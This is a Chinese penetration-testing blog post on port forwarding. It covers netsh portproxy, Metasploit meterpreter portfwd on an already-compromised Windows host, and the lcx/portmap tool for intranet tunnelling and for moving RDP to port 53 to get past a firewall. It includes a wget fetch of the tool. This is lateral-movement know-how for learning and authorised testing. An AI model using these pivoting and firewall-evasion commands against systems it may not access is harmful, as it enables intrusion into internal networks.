+<p>在 Linux 中，使用 iptables 可以非常轻松地配置端口重定向。在 Windows Server 系统上，我们可以使用命令 Netsh 的 Portproxy 模式配置 Windows 中的端口转发。</p>
+<p>netsh 命令已经推出很长时间，在 Windows 2000&#x2F;XP&#x2F;2003 中均带有 netsh 命令。Windows Server 2008 只是对 netsh 的参数项做了些扩展。</p>
+<p><strong>用法：</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>add v4tov4 - 添加 IPv4 </p>
+<p>listenaddress - 等待连接的本地 IP 地址。</p>
+<p>listenport - 本地侦听 TCP 端口。</p>
+<p>connectaddress - 将传入连接重定向到本地或远程 IP 地址（或 DNS 名称）。</p>
+<p>connectport - 一个 TCP 端口，来自 listenport 的连接会被转发到该端口。</p>
+</blockquote>
+<p><strong>本地端口转发到本地端口示例：</strong> </p>
+<p>将本地端口 3389 转发到本地端口 3340 ，其中，本地 IP 为 10.1.1.110 ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用 netstat 确定 3340 端口当前处于被侦听状态：</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr:3340</span><br><span class="line">或者</span><br><span class="line">netstat -antp tcp</span><br></pre></td></tr></table></figure>
+
+<p><strong>显示系统中的转发规则列表：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>
+
+<p>在我们的例子中，只有一个转发规则即从3340到3389端口的转发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Listen on ipv4:             Connect to ipv4:</span><br><span class="line">Address         Port        Address         Port</span><br><span class="line">--------------- ----------  --------------- ----------</span><br><span class="line">10.1.1.110     3340        10.1.1.110     3389</span><br></pre></td></tr></table></figure>
+
+<p><strong>删除指定的端口转发规则：</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=3340 listenaddress=10.1.1.110</span><br></pre></td></tr></table></figure>
+
+<p><strong>清除所有当前的端口转发规则：</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy reset</span><br></pre></td></tr></table></figure>
+
+<p><strong>重要：</strong>以上端口转发仅适用于 TCP 端口，对于 UDP 端口将不起作用，并且不能使用 127.0.0.1 作为连接地址。</p>
+<p><strong>将其他机器的端口转发至本机端口，比如将 192.168.100.101 的 3389 端口转发至本机的 3389 端口：</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=3389 connectport=3389 connectaddress=192.168.100.101</span><br></pre></td></tr></table></figure>
+
+<p>这样执行完以后，访问本机的 3389 端口就可以访问到 192.168.100.101 的 3389 端口了。</p>
+<p>3389 端口通常为 Windows 的远程桌面连接，因此需要先开启 Windows 的远程桌面连接才能实现端口转发，开启后，使用以下命令查看端口开放情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 3389 端口已开放：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240407090636373.png">
+
+
+
+<h3 id="MSF-portfwd-端口转发与端口映射"><a href="#MSF-portfwd-端口转发与端口映射" class="headerlink" title="MSF portfwd 端口转发与端口映射"></a>MSF portfwd 端口转发与端口映射</h3><p>portfwd 是借用 meterpreter shell 建立的连接进行数据传输，达到端口转发的目的。</p>
+<p>使用 portwd 进行端口转发：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 1111  -r 127.0.0.1 -p 3389</span><br></pre></td></tr></table></figure>
+
+<p>-l 表示 localhost ，即 kali 本机；</p>
+<p>因为此时已经与 Windows 目标机器建立了连接，所以 127.0.0.1 指的是已经被拿到 shell 的这台 Windows 机器。</p>
+<p>配置完成后，访问 kali 的 1111 端口，就会转发到 Windows 目标机器的 3389 端口。</p>
+<p><strong>如果将 127.0.0.1 换成其他与 Windows 目标机器处于同一内网的 IP ，那么就可以直接将内网中的其他机器映射到 kali 上，实现内网穿透。</strong></p>
+<p>查看是否建立端口转发连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd list</span><br></pre></td></tr></table></figure>
+
+<p>按本地端口号删除删除连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd delete -l 1111</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="lcx-exe-端口转发工具"><a href="#lcx-exe-端口转发工具" class="headerlink" title="lcx.exe 端口转发工具"></a>lcx.exe 端口转发工具</h3><p>lcx.exe 是一个端口转发工具，有 Windows 版和 Linux 版两个版本，Windows 版是 lcx.exe ，Linux 版为 portmap 。</p>
+<p>下载链接：<a target="_blank" rel="noopener" href="http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip">http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip</a></p>
+<p><strong>Linux 中的使用</strong> </p>
+<p>Linux 中下载：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip</span><br></pre></td></tr></table></figure>
+
+<p>查看帮助文档：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/lcx_vuln.cn]</span><br><span class="line">└─# ./portmap --help</span><br><span class="line">Socket data transport tool</span><br><span class="line"></span><br><span class="line">by Sofia(www.vuln.cn)</span><br><span class="line">Usage:./portmap -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename]</span><br><span class="line"> -v: version</span><br><span class="line"> -h1: host1</span><br><span class="line"> -h2: host2</span><br><span class="line"> -p1: port1</span><br><span class="line"> -p2: port2</span><br><span class="line"> -log: log the data</span><br><span class="line"> -m: the action method for this tool</span><br><span class="line"> 1: listen on PORT1 and connect to HOST2:PORT2</span><br><span class="line"> 2: listen on PORT1 and PORT2</span><br><span class="line"> 3: connect to HOST1:PORT1 and HOST2:PORT2</span><br><span class="line">Let me exit...all overd</span><br></pre></td></tr></table></figure>
+
+<p>这里有一个 -m 参数这个参数的解释：以哪种方式来用这个工具，然后下面有三个方式：<br>1.监听 port1 端口并且连接主机 2 的 port2 端口<br>2.监听 port1 和 port2 端口<br>3.连接主机 1 对应的端口和主机 2 对应的端口</p>
+<p><strong>示例</strong> </p>
+<p>将本机的 6666 端口映射到 192.168.164.8 主机的 22 端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 1 -p1 6666 -h2 192.168.164.8 -p2 22</span><br></pre></td></tr></table></figure>
+
+<p>将本地 7777 端口上的服务转发到 6666 端口上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 2 -p1 6666 -h2 118.*.*.2 -p2 7777</span><br></pre></td></tr></table></figure>
+
+<p>将本地 22 端口转发到外网机器上的 6666 端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 118.*.*.2 -p2 6666</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Windows 中的使用</strong> </p>
+<p><strong>1、lcx 内网端口转发，内网穿透</strong> </p>
+<p>把内网主机的 3389 端口转发到具有公网 ip 主机的 4444 端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 公网主机ip 4444 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+
+<p>监听公网主机本机的 4444 端口请求，并将来自 4444 端口的请求传送给 5555 端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe –listen 4444 5555</span><br></pre></td></tr></table></figure>
+
+<p>此时，RDP 连接，Windows 命令行下输入 mstsc ，即可打开远程桌面连接。</p>
+<p><strong>2、本地端口转发</strong> </p>
+<p>由于防火墙限制，部分端口如 3389 无法通过防火墙，此时可以将该目标主机的 3389 端口转发到防火墙允许的其他端口，如 53 端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -tran 53 目标主机ip 3389</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="各种端口转发后如何连接"><a href="#各种端口转发后如何连接" class="headerlink" title="各种端口转发后如何连接"></a>各种端口转发后如何连接</h3><p>80 端口：直接浏览器访问即可；</p>
+<p>3389 端口：使用 rdesktop 命令，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3389</span><br></pre></td></tr></table></figure>
+
+<p>3306 端口：使用 mysql 命令，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u [用户名] -p [密码] -P [端口号]</span><br></pre></td></tr></table></figure>
+
+
+
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F02-%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F/">内网渗透 02 - 端口扫描</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/05/13/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC6%E9%93%BE%E5%88%86%E6%9E%90/">漏洞篇 - Java 反序列化之 CC6 链</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">妙尽璇机</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8">Stellar 1.26.8</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+<div class="main-mask" onclick="sidebar.toggle()"></div></div></div><div class="scripts">
+<script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.26.8';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js","marked":"/js/plugins/marked.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js","transition":"fade"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js","distance":"16px","duration":800,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","flying_pages":"https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js","css":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css","selector":null});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.26.8" async></script>
+
+<!-- optional -->
+
+
+
+
+
+
+<!-- inject -->
+<script type="text/javascript" src="/custom/js/ZYCode.js"></script>
+</div></body></html>
